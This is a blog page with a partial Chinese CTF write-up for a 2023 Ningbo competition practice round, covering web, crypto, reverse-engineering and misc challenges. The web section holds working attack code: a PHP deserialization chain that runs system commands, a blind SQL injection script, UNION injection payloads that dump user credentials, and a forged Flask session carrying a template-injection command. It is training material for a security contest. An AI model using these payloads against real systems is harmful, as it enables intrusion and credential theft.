
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>2023宁波市赛 天一永安杯赛前模拟题部分wp | Arcueid&#39;s BLOG</title>
    <meta name="author" content="Arcueid" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <link rel="icon" href="/images/Arcueid.jpg" />
    <link rel="preconnect" href="https://cdn.staticfile.net" />
<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.loli.net" />
<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>


<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
<script src="/js/lib/math.js"></script>


<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>ARCUEID&#39;S BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;ARCUEID&#39;S BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>2023宁波市赛 天一永安杯赛前模拟题部分wp</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/16
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/php/" style="color: #ff7d73">php</a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/linux/" style="color: #00bcd4">linux</a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>进hint.php</p>
<p>伪协议读index.php</p>
<pre><code class="php">&lt;?php
class Tiger&#123;
    public $string;
    protected $var;// 恶意参数
    public function __construct($var)&#123;
        $this-&gt;var = $var;
    &#125;
    public function __toString()&#123;
        return $this-&gt;string;
    &#125;
    public function boss($value)&#123;// 0
        @eval($value);
    &#125;
    public function __invoke()&#123;// 1
        $this-&gt;boss($this-&gt;var);
    &#125;
&#125;

class Lion&#123;
    public $tail;
    public function __construct()&#123;
        $this-&gt;tail = array();
    &#125;
    public function __get($value)&#123;
        $function = $this-&gt;tail;
        return $function(); // 2
    &#125;
&#125;


class Monkey&#123;
    public $head;
    public $hand;
    public function __construct($here=&quot;Zoo&quot;)&#123;
        $this-&gt;head = $here;
        echo &quot;Welcome to &quot;.$this-&gt;head.&quot;&lt;br&gt;&quot;;
    &#125;
    public function __wakeup()&#123;//0
        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;head)) &#123;
            echo &quot;hacker&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        &#125;
    &#125;
&#125;

class Elephant&#123;
    public $nose;
    public $nice;
    public function __construct($nice=&quot;nice&quot;)&#123;// 4
        $this-&gt;nice = $nice;
        echo $nice;
    &#125;
    public function __toString()&#123;
        return $this-&gt;nice-&gt;nose;// 3
    &#125;
&#125;

if(isset($_POST[&#39;zoo&#39;]))&#123;
    @unserialize($_POST[&#39;zoo&#39;]);
&#125;
$pop = new Monkey();
$E = new Elephant();
$pop -&gt; head = $E;
$L = new Lion();
$L -&gt; tail = new Tiger(&quot;system(&#39;tac /f14g&#39;);&quot;);
$E -&gt; nice = $L;
$a = urlencode(serialize($pop));
echo &quot;\n&quot;;
echo $a;
// unserialize(urldecode($a));

//O%3A6%3A%22Monkey%22%3A2%3A%7Bs%3A4%3A%22head%22%3BO%3A8%3A%22Elephant%22%3A2%3A%7Bs%3A4%3A%22nose%22%3BN%3Bs%3A4%3A%22nice%22%3BO%3A4%3A%22Lion%22%3A1%3A%7Bs%3A4%3A%22tail%22%3BO%3A5%3A%22Tiger%22%3A2%3A%7Bs%3A6%3A%22string%22%3BN%3Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A20%3A%22system%28%27tac+%2Ff14g%27%29%3B%22%3B%7D%7D%7Ds%3A4%3A%22hand%22%3BN%3B%7D
</code></pre>
<h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p>注释都给过滤了,我一开始没注意,费老半天劲不知道在干什么</p>
<p>然后直接闭合1’or 1&#x3D;’1可以回显</p>
<p>这里一开始就想着盲注了,后来才发现union也可以</p>
<pre><code class="python">import string
import requests
url = &#39;http://040bac98a927037e.node.nsctf.cn/index.php?id=1&#39;
dic = string.ascii_letters+string.digits+&#39;&#125;&#123;-,_&#39;
xxx = &#39;&#39;
for i in range(1,666):
    
    flag = True
    print(&quot;正在注入第&#123;&#125;位&quot;.format(i))
    for j in dic:
        # payload = &quot;&#39;/**/%26%26if(substr(database(),&#123;&#125;,1)=binary&#39;&#123;&#125;&#39;,1,0)%26%26/**/1=/**/&#39;1&quot;.format(i,j)
        payload = &quot;&#39;/**/%26%26if(substr((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics_with_buffer),&#123;&#125;,1)=binary&#39;&#123;&#125;&#39;,1,0)%26%26/**/1=/**/&#39;1&quot;.format(i,j)
        res = requests.get(url=url+payload)
        if &#39;的人名字叫bob&#39; in res.text:
            xxx += j
            flag = False
    print(xxx)
    if flag:
        print(xxx)
        break

    # 数据库 web2
    # 表 atable flag users sys_config
</code></pre>
<p>过滤information了</p>
<p>得无列名注入</p>
<pre><code class="sql">-1&#39;union/**/select/**/1,(select/**/`1`/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/flag)a/**/limit/**/1,1),3&#39;
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/542a56c3392f40fe543a5d6915763027.png" alt="image-20230512203144268"></p>
<p>读账号</p>
<pre><code class="sql">-1&#39;union/**/select/**/1,(select/**/`1`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3&#39; 
</code></pre>
<p>读密码</p>
<pre><code class="sql">-1&#39;union/**/select/**/1,(select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3&#39;
</code></pre>
<p>进login.php登录就拿到flag了</p>
<h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><p>一开始以为ssti,试半天发现怎样都不能注入</p>
<p>扫目录</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/10ace8a6ee383402d7bd5232bb818b52.png" alt="image-20230508204705520"></p>
<pre><code class="python">source in /source&quot;
        return rsp


@app.route(&#39;/source&#39;)
def source():
    f = open(__file__, &#39;r&#39;)
    rsp = f.read()
    f.close()
    return rsp[rsp.index(&#39;source&#39;):]


@app.route(&#39;/admin&#39;)
def admin_handler():
    try:
        role = session.get(&#39;role&#39;)
        if not isinstance(role, dict):
            raise Exception
    except Exception:
        return &#39;~~~~~~hacker!&#39;
    if role.get(&#39;is_admin&#39;) == 1:
        flag = role.get(&#39;flag&#39;) or &#39;admin&#39;
        flag = filter(flag)
        message = &quot;%s, I hope you have a good time!your flag is &quot; % flag
        return render_template_string(message)
    else:
        return &quot;I don&#39;t know you&quot;


if __name__ == &#39;__main__&#39;:
    app.run(&#39;0.0.0.0&#39;, port=80)

</code></pre>
<p>进admin session伪造</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/9549d474c8b37f33f395f09cfcbdaa10.png" alt="image-20230508204809301"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/cbde36a7934a143ae2dec4f160b4ecac.png" alt="image-20230508205422970"></p>
<p><code>eyJyb2xlIjp7ImlzX2FkbWluIjoxLCJuYW1lIjoidGVzdCIsInNlY3JldF9rZXkiOiJWR2d4YzBCdmJtVWhjMlZEY21WMElRPT0ifX0.ZFjw1A.zbhScChV5emlcs855_qO2RnToVQ</code></p>
<p>然后此处存在ssti</p>
<p>payload如下</p>
<img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202305082144662.png" alt="image-20230508214448619"  />

<pre><code>eyJyb2xlIjp7ImlzX2FkbWluIjoxLCJmbGFnIjoie3tsaXBzdW0uX19nbG9iYWxzX18ub3MucG9wZW4oJ2NkIC4uO2NhdCBmKicpLnJlYWQoKX19In19.ZFj8cQ._J4XAqO3oSWZR9tf9q-p2MDJCzY
</code></pre>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ezcal"><a href="#ezcal" class="headerlink" title="ezcal"></a>ezcal</h2><p>rsa数学推导</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6bc596191cef93ffc28e2900ac471609.png" alt="image-20230508210500587"></p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Empathy"><a href="#Empathy" class="headerlink" title="Empathy"></a>Empathy</h2><p>核心代码</p>
<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  char Str2[64]; // [rsp+20h] [rbp-60h] BYREF
  char Str1[256]; // [rsp+60h] [rbp-20h] BYREF
  char Str[256]; // [rsp+160h] [rbp+E0h] BYREF
  int v7; // [rsp+260h] [rbp+1E0h]
  int k; // [rsp+264h] [rbp+1E4h]
  int j; // [rsp+268h] [rbp+1E8h]
  int i; // [rsp+26Ch] [rbp+1ECh]

  sub_401D30(argc, argv, envp);
  puts(&amp;Buffer);
  printf(&amp;Format);
  memset(Str, 0, sizeof(Str));
  memset(Str1, 0, sizeof(Str1));
  scanf(&quot;%s&quot;, Str);
  v7 = strlen(Str);
  if ( v7 != 38 )
  &#123;
    printf(&amp;byte_40504D);
    exit(0);
  &#125;
  for ( i = 0; i &lt; v7; ++i )
    Str[i] = ~Str[i];
  for ( j = 0; j &lt;= 99; ++j )
  &#123;
    sub_401550(&amp;Str[(j + 5) % v7], &amp;Str[(j + 2) % v7]);
    sub_401550(&amp;Str[(j + 1) % v7], &amp;Str[(j + 7) % v7]);
    sub_401550(&amp;Str[(j + 3) % v7], &amp;Str[(j + 10) % v7]);
    sub_401550(&amp;Str[(j + 8) % v7], &amp;Str[(j + 9) % v7]);
  &#125;
  sub_401588(Str, Str1, 0i64);
  Str2[0] = 51;
  Str2[1] = 102;
  Str2[2] = 39;
  Str2[3] = 60;
  Str2[4] = 39;
  Str2[5] = 45;
  Str2[6] = 40;
  Str2[7] = 18;
  Str2[8] = 36;
  Str2[9] = 107;
  Str2[10] = 109;
  Str2[11] = 17;
  Str2[12] = 36;
  Str2[13] = 61;
  Str2[14] = 113;
  Str2[15] = 25;
  Str2[16] = 48;
  Str2[17] = 4;
  Str2[18] = 39;
  Str2[19] = 4;
  Str2[20] = 36;
  Str2[21] = 19;
  Str2[22] = 43;
  Str2[23] = 60;
  Str2[24] = 38;
  Str2[25] = 45;
  Str2[26] = 109;
  Str2[27] = 21;
  Str2[28] = 51;
  Str2[29] = 107;
  Str2[30] = 104;
  Str2[31] = 61;
  Str2[32] = 38;
  Str2[33] = 45;
  Str2[34] = 63;
  Str2[35] = 7;
  Str2[36] = 39;
  Str2[37] = 107;
  Str2[38] = 105;
  Str2[39] = 18;
  Str2[40] = 53;
  Str2[41] = 106;
  Str2[42] = 18;
  Str2[43] = 21;
  Str2[44] = 51;
  Str2[45] = 7;
  Str2[46] = 13;
  Str2[47] = 59;
  Str2[48] = 51;
  Str2[49] = 45;
  Str2[50] = 7;
  Str2[51] = 99;
  for ( k = 0; k &lt;= 51; ++k )
    Str2[k] ^= 0x5Eu;
  if ( !strcmp(Str1, Str2) )
    printf(&amp;byte_405060);
  else
    printf(&amp;byte_405081);
  return 0;
&#125;
</code></pre>
<p>解密脚本</p>
<pre><code class="python">import base64
Str = []
Str.append(51)
Str.append(102)
Str.append(39)
Str.append(60)
Str.append(39)
Str.append(45)
Str.append(40)
Str.append(18)
Str.append(36)
Str.append(107)
Str.append(109)
Str.append(17)
Str.append(36)
Str.append(61)
Str.append(113)
Str.append(25)
Str.append(48)
Str.append(4)
Str.append(39)
Str.append(4)
Str.append(36)
Str.append(19)
Str.append(43)
Str.append(60)
Str.append(38)
Str.append(45)
Str.append(109)
Str.append(21)
Str.append(51)
Str.append(107)
Str.append(104)
Str.append(61)
Str.append(38)
Str.append(45)
Str.append(63)
Str.append(7)
Str.append(39)
Str.append(107)
Str.append(105)
Str.append(18)
Str.append(53)
Str.append(106)
Str.append(18)
Str.append(21)
Str.append(51)
Str.append(7)
Str.append(13)
Str.append(59)
Str.append(51)
Str.append(45)
Str.append(7)
Str.append(99)
res = &#39;&#39;
v7 = 38

for i in range(0,52):
    Str[i] ^= 0x5E;
    res = res + chr(Str[i])
bd_res = base64.b64decode(res)

res2 = []
for i in range(len(bd_res)):
    res2.append(bd_res[i])
    
def swap(a1,a2):
    tmp = res2[a1]
    res2[a1] = res2[a2]
    res2[a2] = tmp
for j in range(99,-1,-1):
    swap((j+8)%v7, (j+9)%v7)
    swap((j+3)%v7, (j+10)%v7)
    swap((j+1)%v7, (j+7)%v7)
    swap((j+5)%v7, (j+2)%v7)
flag = &#39;&#39;
for i in range(len(res2)):
    res2[i] = 255 - res2[i]
    flag += chr(res2[i])
print(flag)
</code></pre>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h2><p>追踪tcp流导出rar包</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8f9da213dee9854aa0ce71702e856bdc.png" alt="image-20230510124343152">得知密码是da19b65c17dc</p>
<p>解压得到flag</p>
<h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>追踪tcp流,导出zip包</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ed305a1e49f6d319dedfd4395889f5cb.png" alt="image-20230509115200536"></p>
<p>里面一个password文件一个加密的文件</p>
<p>password文件尾是jpg</p>
<p>补个文件头FF D8</p>
<p>然后爆破宽高</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/05dc18a08943da1f9cd3882af38f1289.png" alt="image-20230509115738296"></p>
<p>改720</p>
<p>发现类似密码的东西</p>
<p>拿去解压缩包发现不对,一个个隐写工具试过去</p>
<p>发现steghide可行</p>
<p>得到密码</p>
<p>NjBjNDk3YmMxOTM4YzhkNA&#x3D;&#x3D;</p>
<p>60c497bc1938c8d4</p>
<p>解压得到flag</p>

    </div>
    
    
    
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 Arcueid&#39;s BLOG
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;Arcueid
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    




    
</body>
</html>
